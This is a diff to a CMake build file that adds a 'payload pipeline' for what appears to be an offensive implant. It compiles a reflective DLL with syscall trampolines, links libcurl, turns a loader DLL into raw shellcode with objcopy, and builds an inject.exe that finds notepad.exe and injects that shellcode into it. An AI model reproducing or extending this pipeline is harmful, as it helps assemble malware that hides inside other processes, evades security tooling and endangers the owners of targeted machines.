@@ -50,3 +50,99 @@ if(MSVC)
         "/FIXED:NO"
     )
 endif()
+
+# ---------------------------------------------------------------------------
+# Payload pipeline (only when included from the parent myapp build).
+#
+# When configured via add_subdirectory() from the parent, CMAKE_SOURCE_DIR
+# points at the myapp tree and the MYAPPLIB_* variables are set there.
+# Built standalone, only the reflective_dll target above is configured.
+# ---------------------------------------------------------------------------
+if(WIN32 AND NOT CMAKE_SOURCE_DIR STREQUAL CMAKE_CURRENT_SOURCE_DIR)
+
+# GateTrampoline: DoSyscall() assembly trampoline, arch-specific. The .s files
+# are GNU-as ports of the armasm/MSVC-only .asm originals.
+if(CMAKE_SYSTEM_PROCESSOR MATCHES "^(aarch64|ARM64|arm64)")
+    set(GATE_TRAMPOLINE_SRC dll/src/GateTrampolineARM64.s)
+else()
+    set(GATE_TRAMPOLINE_SRC dll/src/GateTrampoline64.s)
+endif()
+set(PROJECT_NAME_LIB ${MYAPPLIB_PROJECT_NAME}lib)
+
+add_library(${PROJECT_NAME_LIB} SHARED
+    dllmain.c
+    ${MYAPPLIB_SRC_FILES}
+    # Position-independent reflective loader: exports ReflectiveLoader() so the
+    # injected shellcode can locate and call it to map this DLL into memory.
+    dll/src/ReflectiveLoader.c
+    # DoSyscall trampoline.
+    ${GATE_TRAMPOLINE_SRC}
+)
+
+# Export ReflectiveLoader(LPVOID) and keep dllmain.cpp's DllMain as the only one.
+set_source_files_properties(dll/src/ReflectiveLoader.c PROPERTIES
+    COMPILE_DEFINITIONS "REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
+)
+target_include_directories(${PROJECT_NAME_LIB} PRIVATE
+    common
+    dll/src
+)
+
+target_link_libraries(${PROJECT_NAME_LIB} json-c)
+target_link_libraries(${PROJECT_NAME_LIB} libcurl)
+target_link_libraries(${PROJECT_NAME_LIB} jpeg)
+
+# Convert the built DLL into a C header so the loader can embed it.
+# NOTE: MinGW prefixes shared libs with "lib"; for MSVC use myapplib.dll instead.
+# The header is generated in the parent build tree's resources/ dir so that
+# shellcode_data.c's `#include "resources/myapplib_dll.h"` keeps resolving via
+# the parent's -I<parent-build-dir>.
+add_command_binary_resource(myapplib_dll ${CMAKE_CURRENT_BINARY_DIR}/libmyapplib.dll ${MYAPPLIB_BINARY_DIR}/resources myapplib_dll SHELLCODE)
+add_custom_target(myapplib_dll_header DEPENDS ${MYAPPLIB_BINARY_DIR}/resources/myapplib_dll.h)
+add_dependencies(myapplib_dll_header ${PROJECT_NAME_LIB})
+target_sources(${MYAPPLIB_PROJECT_NAME} PRIVATE ${MYAPPLIB_BINARY_DIR}/resources/myapplib_dll.h)
+add_dependencies(${MYAPPLIB_PROJECT_NAME} myapplib_dll_header)
+
+# Loader DLL: embeds the reflective DLL via the generated header.
+# Source order matters! The shellcode blob (objcopy .text of this DLL) must be
+# laid out as [entrypoint][embedded DLL bytes][loader helpers + entry_function]
+# so executing from the first byte works and ReflectiveLoader()'s backward
+# image-base scan finds the embedded MZ header before running off the blob.
+add_library(windows_loader SHARED
+    ${MYAPPLIB_SOURCE_DIR}/shellcode_entry.c
+    ${MYAPPLIB_SOURCE_DIR}/shellcode_data.c
+    windows_loader.c
+    ${MYAPPLIB_BINARY_DIR}/resources/myapplib_dll.h
+)
+# NOTE: no -fPIC here. PIC makes lld route the cross-object reference to the
+# embedded DLL through a .refptr.<sym> indirection in .rdata, which would point
+# outside the dumped shellcode blob. Non-PIC COFF codegen on ARM64 is still
+# PC-relative (adrp/add) for in-image references, so the blob stays
+# position-independent AND self-contained.
+target_compile_options(windows_loader PRIVATE -fno-pic -fno-pie -nostdlib)
+target_link_options(windows_loader PRIVATE -nostdlib -Wl,--entry,entrypoint)
+add_dependencies(windows_loader myapplib_dll_header)
+
+# Extract raw shellcode (.text section) from the loader DLL.
+add_custom_command(
+    OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/windows_loader.bin
+    COMMAND ${CMAKE_OBJCOPY} --dump-section .text=${CMAKE_CURRENT_BINARY_DIR}/windows_loader.bin $<TARGET_FILE:windows_loader>
+    DEPENDS $<TARGET_FILE:windows_loader>
+    COMMENT "Extracting .text section from windows_loader.dll"
+)
+
+# Convert shellcode binary to a C header for inject.exe.
+add_command_binary_resource(windows_payload_bin ${CMAKE_CURRENT_BINARY_DIR}/windows_loader.bin ${MYAPPLIB_BINARY_DIR}/resources payload SHELLCODE)
+add_custom_target(windows_loader_bin_header DEPENDS ${MYAPPLIB_BINARY_DIR}/resources/payload.h)
+
+# inject.exe: finds notepad.exe and injects the embedded shellcode.
+add_executable(inject
+    windows_inject.c
+    ${MYAPPLIB_BINARY_DIR}/resources/payload.h
+)
+set_source_files_properties(windows_inject.c PROPERTIES LANGUAGE CXX)
+target_include_directories(inject PRIVATE ${MYAPPLIB_BINARY_DIR}/resources)
+target_link_libraries(inject PRIVATE wsock32 ws2_32)
+add_dependencies(inject windows_loader_bin_header)
+
+endif()
